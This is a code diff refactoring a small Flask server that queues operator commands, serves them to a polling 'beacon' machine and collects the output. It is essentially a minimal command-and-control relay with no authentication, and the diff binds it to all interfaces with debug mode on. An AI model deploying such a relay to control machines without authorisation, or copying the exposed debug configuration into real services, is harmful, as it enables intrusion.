@@ -1,89 +1,73 @@
 from flask import Flask, request, jsonify
 from uuid import uuid4
 import time
+import os  # <-- import os to read environment variables
 
 app = Flask(__name__)
 
-new_jobs = dict()
-finished_jobs = dict()
+# Queues for jobs and results
+pending_jobs = dict()
+completed_jobs = dict()
 
-TIMEOUT = 10
-
+# How long admin waits for job to finish (in seconds)
+ADMIN_TIMEOUT = 10
 
 
 @app.route('/admin', methods=['POST'])
-# new command
 def post_admin():
+    """Admin posts a new command and waits for its result"""
     data = request.get_json()
-    if not data:
-        return jsonify({"error": "No data provided"}), 400
+    if not data or "command" not in data:
+        return jsonify({"error": "No command provided"}), 400
 
     job_id = str(uuid4())
-    job = {"id": job_id, "command": data.get("command", "")}
+    command = data["command"]
 
-    # add job to pending jobs dict
-    new_jobs[job_id] = job
+    # Add job to pending jobs
+    pending_jobs[job_id] = command
+    # Initialize empty result placeholder
+    completed_jobs[job_id] = None
 
-    # initialize finished_jobs entry
-    finished_jobs[job_id] = None
-
+    # Wait for the machine to complete the job
     start = time.time()
-    while time.time() - start < TIMEOUT:
-        result = finished_jobs.get(job_id)
+    while time.time() - start < ADMIN_TIMEOUT:
+        result = completed_jobs.get(job_id)
         if result is not None:
-            finished_jobs.pop(job_id)
-            return jsonify({"message": "Output captured", "data": result}), 200
-        # sleep briefly to avoid busy-waiting
+            # Remove job after completion
+            completed_jobs.pop(job_id)
+            return jsonify({"job_id": job_id, "output": result}), 200
         time.sleep(0.1)
 
     return jsonify({"error": "Timeout waiting for output"}), 504
 
 
-
-
-
-
-
-
-@app.route('/command', methods=['GET'])
-# beacon
+@app.route('/machine', methods=['GET'])
 def get_command():
-    if not new_jobs:  # dict is empty
-        return jsonify({}), 200
+    """Machine beacons for a command"""
+    if not pending_jobs:
+        return jsonify({"message": "No commands available"}), 200
 
-    # get the first job (dicts preserve insertion order in Python 3.7+)
-    job_id, job = next(iter(new_jobs.items()))
+    # Get the first pending job
+    job_id, command = next(iter(pending_jobs.items()))
+    # Remove from pending so it won't be re-assigned
+    pending_jobs.pop(job_id)
 
-    # remove it from the dict so it's not given again
-    new_jobs.pop(job_id)
-
-    return jsonify({
-        "message": "Command attached",
-        "command": job["command"],
-        "id": job_id
-    }), 200
+    return jsonify({"job_id": job_id, "command": command}), 200
 
 
-
-@app.route('/command', methods=['POST'])
-# served command
-def post_command():
+@app.route('/machine', methods=['POST'])
+def post_result():
+    """Machine posts completed job output"""
     data = request.get_json()
-    if not data:
-        return jsonify({"error": "No data provided"}), 400
-    
-    job_id = data.get("id")
-    output = data.get("output", "")
-    
-    # store result in dict keyed by job_id
-    finished_jobs[job_id] = output
+    if not data or "job_id" not in data or "output" not in data:
+        return jsonify({"error": "Invalid data"}), 400
 
-    # For debugging, you might want to log the received data
-    # print(f"Received output for job {job_id}: {output}")
-    
-    return jsonify({"message": "Output captured"}), 200
+    job_id = data["job_id"]
+    completed_jobs[job_id] = data["output"]
 
+    return jsonify({"message": f"Output received for job {job_id}"}), 200
 
 
 if __name__ == '__main__':
-    app.run(debug=True, port=5000)
+    port = int(os.getenv("PORT", 5000))  # Read port from environment, default to 5000
+    app.run(debug=True, host="0.0.0.0", port=port)
